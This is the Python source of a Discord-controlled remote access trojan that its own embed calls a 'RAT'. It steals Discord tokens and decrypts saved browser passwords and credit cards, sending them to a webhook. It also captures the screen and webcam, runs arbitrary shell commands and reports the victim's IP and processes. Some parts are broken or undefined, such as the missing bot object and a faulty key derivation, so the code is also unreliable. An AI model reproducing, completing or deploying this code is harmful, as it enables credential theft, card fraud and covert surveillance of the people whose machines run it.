# Ready Mader


import discord
from discord.ext import commands
import pyautogui
import socket
from PIL import ImageGrab
import subprocess
import asyncio
import os
import webbrowser
import requests
import base64
import json
import shutil
import sqlite3
from datetime import datetime, timedelta
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import re
from urllib.request import Request, urlopen
import time
import tempfile
import tempfile
import os
import requests
import json
import pygame.camera
import pygame.image
import pyaudio
import ctypes
import shutil
import sys
import psutil
import platform

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True
intents.voice_states = True
sessions = {}




appdata = os.getenv('LOCALAPPDATA')
browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
}






PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

@bot.command()
async def get_tokens(ctx):
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    message = '@everyone' if PING_ME else ''
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{platform}**\n```'
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'
        message += '```'
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    try:
        req = Request(webhook_url, data=payload.encode(), headers=headers)
        urlopen(req)
        await ctx.send("Tokens sent to the webhook.")
    except:
        await ctx.send("An error occurred while sending tokens to the webhook.")

def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = key[12:]
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        salt=b'saltysalt',
        iterations=1003,
        length=16,  # Corrected parameter
        backend=default_backend()
    )
    key = kdf.derive(key)
    return key




def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    tag = buff[-16:]  
    payload = buff[15:-16]  
    try:
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_pass = decryptor.update(payload) + decryptor.finalize()
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return str(e)



def save_results(browser_name, type_of_data, content):
    if content is not None:
        temp_dir = tempfile.gettempdir()
        temp_file_path = os.path.join(temp_dir, f'{type_of_data}.txt')

        with open(temp_file_path, 'w', encoding="utf-8") as file:
            file.write(content)
        print(f"\t [*] Saved temporary file in {temp_file_path}")

        headers = {
            "Content-Type": "application/json"
        }
        payload = {"content": f"Here is the {type_of_data} file:"}

        with open(temp_file_path, 'rb') as file:
            response = requests.post(webhook_url, json=payload, headers=headers, files={'file': (f'{type_of_data}.txt', file)})


def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

def send_to_webhook(data):
    payload = {
        "content": data
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, json=payload, headers=headers)
    if response.status_code == 204:
        print("Data sent to Discord webhook successfully.")
    else:
        print(f"Failed to send data to Discord webhook. Status code: {response.status_code}")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name="ss")
async def screenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=".png")  # Change ".png" to your desired file extension
        screenshot.save(temp_file.name)
        await ctx.send(file=discord.File(temp_file.name))
        temp_file.close()
        os.unlink(temp_file.name)
    except Exception as e:
        print(f"Error: {e}")
        await ctx.send(f"Error: {e}")

p = pyaudio.PyAudio()

# Define audio settings
SAMPLE_RATE = 48000
CHANNELS = 1
FRAME_SIZE = 960

# Initialize Opus encoder


# Variable to keep track of the audio stream
audio_stream = None


# Variable to keep track of the audio stream
audio_stream = None

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')


@bot.command()
async def leave(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send('Left the voice channel.')


@bot.command()
async def webcam(ctx):
    pygame.camera.init()
    cam_list = pygame.camera.list_cameras()
    if not cam_list:
        await ctx.send("No cameras found.")
        return
    
    cam = pygame.camera.Camera(cam_list[0], (1920, 80))  # Adjust resolution as needed
    cam.start()
    asyncio.timeout(2)
    image = cam.get_image()
    pygame.image.save(image, "webcam_capture.png")
    cam.stop()
    await ctx.send(file=discord.File("webcam_capture.png"))

@bot.command(name='ip')
async def get_ip(ctx):
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    await ctx.send(f"IP Address: {ip_address}")

 
@bot.command(name='start_screenshare')
async def start_screenshare(ctx):
    voice_channel = ctx.author.voice.channel
    vc = await voice_channel.connect()

    text_channel = ctx.channel  

    while vc.is_connected():
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await text_channel.send("Screen Share:", file=discord.File("screenshot.png"))
        await asyncio.sleep(0.5)


@bot.command(name='stop_screenshare')
async def stop_screenshare(ctx):
    vc = sessions.get(ctx.author.id)

    if vc:
        await vc.disconnect()
        del sessions[ctx.author.id]
    else:
        await ctx.send("Not in a voice channel!")

@bot.command(name='cmd')
async def remote_command(ctx, *, command):
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        result = stdout.decode() or stderr.decode() or "No output."

        await ctx.send(f"Command Output:\n```\n{result}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")



@bot.command(name='write')
async def write(ctx, repeat_count, delay_seconds):
    try:
        repeat_count = int(repeat_count)
        delay_seconds = float(delay_seconds)
    except ValueError:
        await ctx.send("Invalid input. Please use the format: !write <repeat_count> <delay_seconds>")
        return

    user_message = await ctx.send("Type the message you want to send repeatedly:")
    try:
        def check(message):
            return message.author == ctx.author and message.channel == ctx.channel

        message = await bot.wait_for('message', timeout=30.0, check=check)
        text = message.content
    except asyncio.TimeoutError:
        await ctx.send("You didn't enter a message in time.")
        await user_message.delete()
        return

    await user_message.delete()

    for _ in range(repeat_count):
        await ctx.send(text)
        await asyncio.sleep(delay_seconds)

@bot.command(name='open')
async def open_website(ctx, site):
    try:
        webbrowser.open(site)
        await ctx.send(f"Opening {site}")
    except Exception as e:
        await ctx.send(f"An error occurred while trying to open the website: {str(e)}")

@bot.command(name="psswords")
async def get_browser_data(ctx):
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        await ctx.send(f"Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            await ctx.send(f"Getting {data_type_name.replace('_', ' ').capitalize()}")
            data = get_data(browser_path, "Default", master_key, data_type)

         
            temp_dir = tempfile.gettempdir()
            temp_file_path = os.path.join(temp_dir, f'{browser}_{data_type_name}.txt')
            with open(temp_file_path, 'w', encoding="utf-8") as file:
                file.write(data)

            try:
             
                with open(temp_file_path, 'rb') as file:
                    await ctx.send(f"Here is the {data_type_name} file from {browser}:", file=discord.File(file))
                
    
                os.remove(temp_file_path)
            except Exception as e:
                print(f"An error occurred while sending data to the channel for {browser} - {data_type_name}: {str(e)}")


@bot.command(name="Info")
async def startup_info(ctx):
    try:
        ip_address = requests.get("https://api.ipify.org?format=json").json().get("ip")
    except requests.RequestException as e:
        ip_address = "Error: Unable to fetch IP address."

    embed = discord.Embed(title="RAT Information", description="Here is the RATS startup information:", color=0x00ff00)
    embed.add_field(name="External IP Address", value=ip_address)
    embed.add_field(name="PC Name", value=platform.node())
    embed.add_field(name="HWID", value=psutil.disk_usage('/').total)
    await ctx.send(embed=embed)


@bot.command()
async def processes(ctx):
    processes_info = []
    for process in psutil.process_iter(attrs=['pid', 'name']):
        processes_info.append(f"**PID:** {process.info['pid']} | **Name:** {process.info['name']}")

    if not processes_info:
        await ctx.send("No running processes found.")
    else:
        process_list = "\n".join(processes_info)

        # Write the process information to a text file
        with open("processes.txt", "w") as file:
            file.write(process_list)

        # Send the text file
        with open("processes.txt", "rb") as file:
            await ctx.send(file=discord.File(file, "processes.txt"))





bot.run(AuthToken)
